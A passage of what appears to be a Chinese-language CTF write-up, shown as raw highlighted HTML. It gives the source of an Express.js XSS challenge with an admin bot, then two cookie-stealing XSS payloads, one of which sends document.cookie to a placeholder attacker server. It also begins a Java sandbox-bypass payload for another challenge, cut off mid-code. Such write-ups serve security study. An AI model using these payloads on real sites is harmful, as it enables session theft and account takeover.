class_\">PrivilegedPassWord</span>=<span class=\"title function_\">stringRandom</span>(<span class=\"number\">16</span>, &#123; <span class=\"attr\">numbers</span>: <span class=\"literal\">true</span> &#125;)</span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title class_\">PlainPassWord</span>=<span class=\"title function_\">stringRandom</span>(<span class=\"number\">16</span>, &#123; <span class=\"attr\">numbers</span>: <span class=\"literal\">true</span> &#125;)</span><br><span class=\"line\"><span class=\"keyword\">const</span> secret_key=<span class=\"title function_\">stringRandom</span>(<span class=\"number\">16</span>, &#123; <span class=\"attr\">numbers</span>: <span class=\"literal\">true</span> &#125;)</span><br><span class=\"line\"><span class=\"keyword\">const</span> users = [];</span><br><span class=\"line\"><span class=\"keyword\">const</span> posts = [];</span><br><span class=\"line\"><span class=\"keyword\">const</span> store = [];</span><br><span class=\"line\">users.<span class=\"title function_\">push</span>(&#123; <span class=\"attr\">username</span>:<span class=\"string\">&quot;admin&quot;</span>, <span class=\"attr\">password</span>:<span class=\"title class_\">AdminPassWord</span>, <span class=\"attr\">role</span>: <span class=\"string\">&quot;admin&quot;</span> &#125;);</span><br><span class=\"line\">users.<span class=\"title function_\">push</span>(&#123; <span class=\"attr\">username</span>:<span class=\"string\">&quot;privileged&quot;</span>, <span class=\"attr\">password</span>:<span class=\"title class_\">PrivilegedPassWord</span>, <span class=\"attr\">role</span>: <span class=\"string\">&quot;privileged&quot;</span> &#125;);</span><br><span class=\"line\">users.<span class=\"title function_\">push</span>(&#123; <span class=\"attr\">username</span>:<span class=\"string\">&quot;plain&quot;</span>, <span class=\"attr\">password</span>:<span class=\"title class_\">PlainPassWord</span>, <span class=\"attr\">role</span>: <span class=\"string\">&quot;plain&quot;</span> &#125;);</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(users)</span><br><span class=\"line\">app.<span class=\"title function_\">use</span>(express.<span class=\"title function_\">static</span>(<span class=\"string\">&#x27;views&#x27;</span>));</span><br><span class=\"line\">app.<span class=\"title function_\">set</span>(<span class=\"string\">&#x27;view engine&#x27;</span>, <span class=\"string\">&#x27;ejs&#x27;</span>);</span><br><span class=\"line\">app.<span class=\"title function_\">use</span>(bodyParser.<span class=\"title function_\">urlencoded</span>(&#123; <span class=\"attr\">extended</span>: <span class=\"literal\">true</span> &#125;));</span><br><span class=\"line\">app.<span class=\"title function_\">use</span>(<span class=\"title function_\">session</span>(&#123;</span><br><span class=\"line\">    <span class=\"attr\">secret</span>: secret_key,</span><br><span class=\"line\">    <span class=\"attr\">resave</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    <span class=\"attr\">saveUninitialized</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    <span class=\"attr\">cookie</span>: &#123;</span><br><span class=\"line\">        <span class=\"attr\">httpOnly</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">        <span class=\"attr\">secure</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;));</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">use</span>(<span class=\"string\">&#x27;/&#x27;</span>, <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;./index&#x27;</span>)(users,posts,store,<span class=\"title class_\">AdminPassWord</span>,<span class=\"title class_\">PrivilegedPassWord</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">app.<span class=\"title function_\">listen</span>(port, <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">`App is running on http://localhost:<span class=\"subst\">$&#123;port&#125;</span>`</span>);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">#bot.<span class=\"property\">js</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> puppeteer = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;puppeteer&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">triggerXSS</span>(<span class=\"params\">UserName, PassWord</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> browser = <span class=\"keyword\">await</span> puppeteer.<span class=\"title function_\">launch</span>(&#123;</span><br><span class=\"line\">        <span class=\"attr\">args</span>: [<span class=\"string\">&#x27;--no-sandbox&#x27;</span>, <span class=\"string\">&#x27;--disable-setuid-sandbox&#x27;</span>],</span><br><span class=\"line\">        <span class=\"attr\">executablePath</span>: <span class=\"string\">&#x27;/usr/bin/chromium&#x27;</span>,</span><br><span class=\"line\">        <span class=\"attr\">headless</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">const</span> page = <span class=\"keyword\">await</span> browser.<span class=\"title function_\">newPage</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">await</span> page.<span class=\"title function_\">goto</span>(<span class=\"string\">&#x27;http://localhost:3000/login&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">await</span> page.<span class=\"title function_\">type</span>(<span class=\"string\">&#x27;input[name=&quot;username&quot;]&#x27;</span>, <span class=\"title class_\">UserName</span>);</span><br><span class=\"line\">    <span class=\"keyword\">await</span> page.<span class=\"title function_\">type</span>(<span class=\"string\">&#x27;input[name=&quot;password&quot;]&#x27;</span>, <span class=\"title class_\">PassWord</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">await</span> page.<span class=\"title function_\">click</span>(<span class=\"string\">&#x27;button[type=&quot;submit&quot;]&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">await</span> page.<span class=\"title function_\">goto</span>(<span class=\"string\">&#x27;http://localhost:3000/&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">await</span> browser.<span class=\"title function_\">close</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">module</span>.<span class=\"property\">exports</span> = &#123; triggerXSS &#125;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">#index.<span class=\"property\">js</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> fs = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;fs&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> express = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;express&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> router = express.<span class=\"title class_\">Router</span>();</span><br><span class=\"line\"><span class=\"keyword\">const</span> &#123; triggerXSS &#125; = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;../bot&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> &#123; <span class=\"title class_\">Store</span> &#125; = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;express-session&#x27;</span>);</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">isAuthenticated</span>(<span class=\"params\">req, res, next</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (req.<span class=\"property\">session</span>.<span class=\"property\">user</span>) &#123;</span><br><span class=\"line\">        <span class=\"title function_\">next</span>();</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        res.<span class=\"title function_\">redirect</span>(<span class=\"string\">&#x27;/login&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable language_\">module</span>.<span class=\"property\">exports</span> = <span class=\"function\">(<span class=\"params\">users,posts,store,AdminPassWord,PrivilegedPassWord</span>) =&gt;</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"variable constant_\">ROLES</span> = &#123;</span><br><span class=\"line\">        <span class=\"attr\">PLAIN</span>: <span class=\"string\">&quot;plain&quot;</span>,</span><br><span class=\"line\">        <span class=\"attr\">PRIVILEGED</span>: <span class=\"string\">&quot;privileged&quot;</span>,</span><br><span class=\"line\">        <span class=\"attr\">ADMIN</span>: <span class=\"string\">&quot;admin&quot;</span>,</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    router.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;/register&#x27;</span>, <span class=\"function\">(<span class=\"params\">req, res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        res.<span class=\"title function_\">sendFile</span>(<span class=\"string\">&#x27;register.html&#x27;</span>, &#123; <span class=\"attr\">root</span>: <span class=\"string\">&#x27;./views&#x27;</span> &#125;);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">    router.<span class=\"title function_\">post</span>(<span class=\"string\">&#x27;/register&#x27;</span>, <span class=\"function\">(<span class=\"params\">req, res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> &#123; username, password, role &#125; = req.<span class=\"property\">body</span>;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> userExists = users.<span class=\"title function_\">some</span>(<span class=\"function\"><span class=\"params\">u</span> =&gt;</span> u.<span class=\"property\">username</span> === username);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (userExists) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> res.<span class=\"title function_\">send</span>(<span class=\"string\">&#x27;Username already exists!&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        users.<span class=\"title function_\">push</span>(&#123; username, password, <span class=\"attr\">role</span>: <span class=\"string\">&quot;plain&quot;</span> &#125;);</span><br><span class=\"line\">        res.<span class=\"title function_\">redirect</span>(<span class=\"string\">&#x27;/login&#x27;</span>);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    router.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;/login&#x27;</span>, <span class=\"function\">(<span class=\"params\">req, res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        res.<span class=\"title function_\">sendFile</span>(<span class=\"string\">&#x27;login.html&#x27;</span>, &#123; <span class=\"attr\">root</span>: <span class=\"string\">&#x27;./views&#x27;</span> &#125;);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">    router.<span class=\"title function_\">post</span>(<span class=\"string\">&#x27;/login&#x27;</span>, <span class=\"function\">(<span class=\"params\">req, res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> &#123; username, password &#125; = req.<span class=\"property\">body</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(username);</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(password);</span><br><span class=\"line\">        <span class=\"keyword\">const</span> user = users.<span class=\"title function_\">find</span>(<span class=\"function\"><span class=\"params\">u</span> =&gt;</span> u.<span class=\"property\">username</span> === username &amp;&amp; u.<span class=\"property\">password</span> === password);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (user) &#123;</span><br><span class=\"line\">            req.<span class=\"property\">session</span>.<span class=\"property\">user</span> = user;</span><br><span class=\"line\">            res.<span class=\"title function_\">redirect</span>(<span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            res.<span class=\"title function_\">send</span>(<span class=\"string\">&#x27;Invalid credentials!&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    router.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;/&#x27;</span>, isAuthenticated, <span class=\"function\">(<span class=\"params\">req, res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> currentUser = req.<span class=\"property\">session</span>.<span class=\"property\">user</span>;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> filteredPosts = [];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (currentUser.<span class=\"property\">role</span> === <span class=\"variable constant_\">ROLES</span>.<span class=\"property\">ADMIN</span>) &#123;</span><br><span class=\"line\">            filteredPosts = posts.<span class=\"title function_\">filter</span>(<span class=\"function\"><span class=\"params\">p</span> =&gt;</span> p.<span class=\"property\">role</span> === <span class=\"variable constant_\">ROLES</span>.<span class=\"property\">PRIVILEGED</span> || p.<span class=\"property\">role</span> === <span class=\"variable constant_\">ROLES</span>.<span class=\"property\">ADMIN</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentUser.<span class=\"property\">role</span> === <span class=\"variable constant_\">ROLES</span>.<span class=\"property\">PRIVILEGED</span>) &#123;</span><br><span class=\"line\">            filteredPosts = posts.<span class=\"title function_\">filter</span>(<span class=\"function\"><span class=\"params\">p</span> =&gt;</span> p.<span class=\"property\">role</span> === <span class=\"variable constant_\">ROLES</span>.<span class=\"property\">PLAIN</span> || p.<span class=\"property\">role</span> === <span class=\"variable constant_\">ROLES</span>.<span class=\"property\">PRIVILEGED</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            filteredPosts = posts.<span class=\"title function_\">filter</span>(<span class=\"function\"><span class=\"params\">p</span> =&gt;</span> p.<span class=\"property\">role</span> === <span class=\"variable constant_\">ROLES</span>.<span class=\"property\">PLAIN</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        res.<span class=\"title function_\">render</span>(<span class=\"string\">`<span class=\"subst\">$&#123;currentUser.role&#125;</span>`</span>, &#123; <span class=\"attr\">posts</span>: filteredPosts, <span class=\"attr\">user</span>: currentUser &#125;);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    router.<span class=\"title function_\">post</span>(<span class=\"string\">&#x27;/post&#x27;</span>, isAuthenticated, <span class=\"function\">(<span class=\"params\">req, res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> &#123; content &#125; = req.<span class=\"property\">body</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">const</span> scriptTagRegex = <span class=\"regexp\">/&lt;script\\b[^&lt;]*(?:(?!&lt;\\/script&gt;)&lt;[^&lt;]*)*&lt;\\/script&gt;/gi</span>;</span><br><span class=\"line\">        content = content.<span class=\"title function_\">replace</span>(scriptTagRegex, <span class=\"string\">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">const</span> eventHandlerRegex = <span class=\"regexp\">/on\\w+\\s*=\\s*([&quot;&#x27;]).*?\\1/gi</span>;</span><br><span class=\"line\">        content = content.<span class=\"title function_\">replace</span>(eventHandlerRegex, <span class=\"string\">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">const</span> javascriptURLRegex = <span class=\"regexp\">/(?:href|src)\\s*=\\s*([&quot;&#x27;])\\s*javascript:.*?\\1/gi</span>;</span><br><span class=\"line\">        content = content.<span class=\"title function_\">replace</span>(javascriptURLRegex, <span class=\"string\">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">const</span> dataURLRegex = <span class=\"regexp\">/(?:href|src)\\s*=\\s*([&quot;&#x27;])\\s*data:.*?\\1/gi</span>;</span><br><span class=\"line\">        content = content.<span class=\"title function_\">replace</span>(dataURLRegex, <span class=\"string\">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">const</span> cssExpressionRegex = <span class=\"regexp\">/style\\s*=\\s*([&quot;&#x27;]).*?expression\\([^&gt;]*?\\).*?\\1/gi</span>;</span><br><span class=\"line\">        content = content.<span class=\"title function_\">replace</span>(cssExpressionRegex, <span class=\"string\">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">const</span> dangerousTagsRegex = <span class=\"regexp\">/&lt;\\/?(?:iframe|object|embed|link|meta|svg|base|source|form|input|video|audio|textarea|button|frame|frameset|applet)[^&gt;]*?&gt;/gi</span>;</span><br><span class=\"line\">        content = content.<span class=\"title function_\">replace</span>(dangerousTagsRegex, <span class=\"string\">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">const</span> dangerousAttributesRegex = <span class=\"regexp\">/\\b(?:style|srcset|formaction|xlink:href|contenteditable|xmlns)\\s*=\\s*([&quot;&#x27;]).*?\\1/gi</span>;</span><br><span class=\"line\">        content = content.<span class=\"title function_\">replace</span>(dangerousAttributesRegex, <span class=\"string\">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">const</span> dangerousProtocolsRegex = <span class=\"regexp\">/(?:href|src)\\s*=\\s*([&quot;&#x27;])(?:\\s*javascript:|vbscript:|file:|data:|filesystem:).*?\\1/gi</span>;</span><br><span class=\"line\">        content = content.<span class=\"title function_\">replace</span>(dangerousProtocolsRegex, <span class=\"string\">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">const</span> dangerousFunctionsRegex = <span class=\"regexp\">/\\b(?:eval|alert|prompt|confirm|console\\.log|Function)\\s*\\(/gi</span>;</span><br><span class=\"line\">        content = content.<span class=\"title function_\">replace</span>(dangerousFunctionsRegex, <span class=\"string\">&#x27;[XSS attempt blocked]&#x27;</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">        posts.<span class=\"title function_\">push</span>(&#123; <span class=\"attr\">content</span>: content, <span class=\"attr\">username</span>: req.<span class=\"property\">session</span>.<span class=\"property\">user</span>.<span class=\"property\">username</span>, <span class=\"attr\">role</span>: req.<span class=\"property\">session</span>.<span class=\"property\">user</span>.<span class=\"property\">role</span> &#125;);</span><br><span class=\"line\">        res.<span class=\"title function_\">redirect</span>(<span class=\"string\">&#x27;/&#x27;</span>);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">    router.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;/logout&#x27;</span>, <span class=\"function\">(<span class=\"params\">req, res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        req.<span class=\"property\">session</span>.<span class=\"title function_\">destroy</span>();</span><br><span class=\"line\">        res.<span class=\"title function_\">redirect</span>(<span class=\"string\">&#x27;/login&#x27;</span>);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    router.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;/report_admin&#x27;</span>, <span class=\"keyword\">async</span> (req, res) =&gt; &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">await</span> <span class=\"title function_\">triggerXSS</span>(<span class=\"string\">&quot;admin&quot;</span>,<span class=\"title class_\">AdminPassWord</span>);</span><br><span class=\"line\">            res.<span class=\"title function_\">send</span>(<span class=\"string\">`Admin Bot successfully logged in.`</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (error) &#123;</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">error</span>(<span class=\"string\">&#x27;Error Reporting:&#x27;</span>, error);</span><br><span class=\"line\">            res.<span class=\"title function_\">send</span>(<span class=\"string\">`Admin Bot successfully logged in.`</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    router.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;/report_privileged&#x27;</span>, <span class=\"keyword\">async</span> (req, res) =&gt; &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">await</span> <span class=\"title function_\">triggerXSS</span>(<span class=\"string\">&quot;privileged&quot;</span>,<span class=\"title class_\">PrivilegedPassWord</span>);</span><br><span class=\"line\">            res.<span class=\"title function_\">send</span>(<span class=\"string\">`Privileged Bot successfully logged in.`</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (error) &#123;</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">error</span>(<span class=\"string\">&#x27;Error Reporting:&#x27;</span>, error);</span><br><span class=\"line\">            res.<span class=\"title function_\">send</span>(<span class=\"string\">`Privileged Bot successfully logged in.`</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    router.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;/store&#x27;</span>, <span class=\"keyword\">async</span> (req, res) =&gt; &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> res.<span class=\"title function_\">status</span>(<span class=\"number\">200</span>).<span class=\"title function_\">json</span>(store);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    router.<span class=\"title function_\">post</span>(<span class=\"string\">&#x27;/store&#x27;</span>, <span class=\"keyword\">async</span> (req, res) =&gt; &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (req.<span class=\"property\">body</span>) &#123;</span><br><span class=\"line\">            store.<span class=\"title function_\">push</span>(req.<span class=\"property\">body</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> res.<span class=\"title function_\">status</span>(<span class=\"number\">200</span>).<span class=\"title function_\">send</span>(<span class=\"string\">&#x27;Data stored successfully&#x27;</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> res.<span class=\"title function_\">status</span>(<span class=\"number\">400</span>).<span class=\"title function_\">send</span>(<span class=\"string\">&#x27;No data received&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    router.<span class=\"title function_\">get</span>(<span class=\"string\">&#x27;/flag&#x27;</span>, <span class=\"keyword\">async</span> (req, res) =&gt; &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (req.<span class=\"property\">session</span>.<span class=\"property\">user</span> &amp;&amp; req.<span class=\"property\">session</span>.<span class=\"property\">user</span>.<span class=\"property\">role</span> === <span class=\"string\">&quot;admin&quot;</span>) &#123;</span><br><span class=\"line\">                fs.<span class=\"title function_\">readFile</span>(<span class=\"string\">&#x27;/flag&#x27;</span>, <span class=\"string\">&#x27;utf8&#x27;</span>, <span class=\"function\">(<span class=\"params\">err, data</span>) =&gt;</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (err) &#123;</span><br><span class=\"line\">                        <span class=\"variable language_\">console</span>.<span class=\"title function_\">error</span>(<span class=\"string\">&#x27;Error reading flag file:&#x27;</span>, err);</span><br><span class=\"line\">                        <span class=\"keyword\">return</span> res.<span class=\"title function_\">status</span>(<span class=\"number\">500</span>).<span class=\"title function_\">send</span>(<span class=\"string\">&#x27;Internal Server Error&#x27;</span>);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    res.<span class=\"title function_\">send</span>(<span class=\"string\">`Your Flag Here: <span class=\"subst\">$&#123;data&#125;</span>`</span>);</span><br><span class=\"line\">                &#125;);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                res.<span class=\"title function_\">status</span>(<span class=\"number\">403</span>).<span class=\"title function_\">send</span>(<span class=\"string\">&#x27;Unauthorized!&#x27;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (error) &#123;</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">error</span>(<span class=\"string\">&#x27;Error fetching flag:&#x27;</span>, error);</span><br><span class=\"line\">            res.<span class=\"title function_\">status</span>(<span class=\"number\">500</span>).<span class=\"title function_\">send</span>(<span class=\"string\">&#x27;Internal Server Error&#x27;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> router;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这个题一眼xss嘛，然后有两种解题思路，一个是插入js代码利用/store路由，然后访问/report_privileged将privilege用户的cookie储存到/store中，然后同样的步骤再来一次获取admin的cookie</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;<span class=\"title function_\">fetch</span>(<span class=\"string\">&#x27;/store&#x27;</span>,&#123;<span class=\"attr\">body</span>:<span class=\"string\">&quot;&#x27;&#x27;p&quot;</span>+<span class=\"string\">`rivileged_cookie&#x27;&#x27;=`</span>+<span class=\"built_in\">encodeURIComponent</span>(<span class=\"variable language_\">document</span>.<span class=\"property\">cookie</span>),<span class=\"attr\">method</span>:<span class=\"string\">&#x27;POST&#x27;</span>,<span class=\"attr\">headers</span>:&#123;<span class=\"string\">&#x27;Content-Type&#x27;</span>:<span class=\"string\">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;&#125;)&lt;/script</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n\n<p>或者就是直接弹出privilege和admin的cookie</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;img src=&quot;&quot; onerror=document.location=&#x27;http://vps:port?cookie=&#x27;+document.cookie /&gt;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"OnlineRunner\"><a href=\"#OnlineRunner\" class=\"headerlink\" title=\"OnlineRunner\"></a>OnlineRunner</h1><p>这道题没有办法用import的方式来导入类，能执行命令的都不能用，反射也没有办法直接执行命令，看别的师傅是要绕过一个沙箱</p>\n<p><a href=\"https://vidar-team.feishu.cn/docx/AUvRdig4roPFOuxRvxAcpT81n9b\">探索Java RASP Bypass新姿势</a></p>\n<p>这里我还是有点懵，直接贴别的师傅的payload</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">String[] files = &#123;<span class=\"string\">&quot;/proc/net/tcp&quot;</span>, <span class=\"string\">&quot;/proc/net/tcp6&quot;</span>&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">f</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; f &lt; files.length; f++) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                java.io.<span class=\"type\">BufferedReader</span> <span class=\"variable\">reader</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">java</span>.io.BufferedReader(<span class=\"keyword\">new</span> <span class=\"title class_\">java</span>.io.FileReader(files[f]));</span><br><span class=\"line\">                String line;</span><br><span class=\"line\">                reader.readLine(); <span class=\"comment\">// Skip header line</span></span><br><span class=\"line\">                <span class=\"keyword\">while</span> ((line = reader.readLine()) != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    line = line.trim();</span><br><span class=\"line\">                    String[] parts = line.split(<span class=\"string\">&quot;\\\\s+&quot;</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (parts.length &gt; <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">                        <span class=\"type\">String</span> <span class=\"variable\">local_address</span> <span class=\"operator\">=</span> parts[<span class=\"number\">1</span>];</span><br><span class=\"line\">                        <span class=\"type\">String</span> <span class=\"variable\">state</span> <span class=\"operator\">=</span> parts[<span class=\"number\">3</span>];</span><br><span class=\"line\">                        <span class=\"comment\">// State 0A means LISTEN</span></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (state.equals(<span class=\"string\">&quot;0A&quot;</span>)) &#123;</span><br><span class=\"line\">                            String[] addrPort = local_address.split(<span class=\"string\">&quot;:&quot;</span>);</span><br><span class=\"line\">                            <span class=\"type\">String</span> <span class=\"variable\">ipHex</span> <span class=\"operator\">=</span> addrPort[<span class=\"number\">0</span>];</span><br><span class=\"line\">                            <span class=\"type\">String</span> <span class=\"variable\">portHex</span> <span class=\"operator\">=</span> addrPort[<span class=\"number\">1</span>];</span><br><span class=\"line\">                            <span class=\"type\">String</span> <span class=\"variable\">ip</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (files[f].endsWith(<span class=\"string\">&quot;tcp6&quot;</span>)) &#123;</span><br><span class=\"line\">                                <span class=\"comment\">// IPv6 address parsing</span></span><br><span class=\"line\">                                <span class=\"type\">StringBuilder</span> <span class=\"variable\">ipBuilder</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>();</span><br><span class=\"line\">                                <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> ipHex.length(); i &gt; <span class=\"number\">0</span>; i -= <span class=\"number\">8</span>) &#123;</span><br><span class=\"line\">                                    <span class=\"type\">String</span> <span class=\"variable\">segment</span> <span class=\"operator\">=</span> ipHex.substring(Math.max(i - <span class=\"number\">8</span>, <span class=\"number\">0</span>), i);</span><br><span class=\"line\">                                    <span 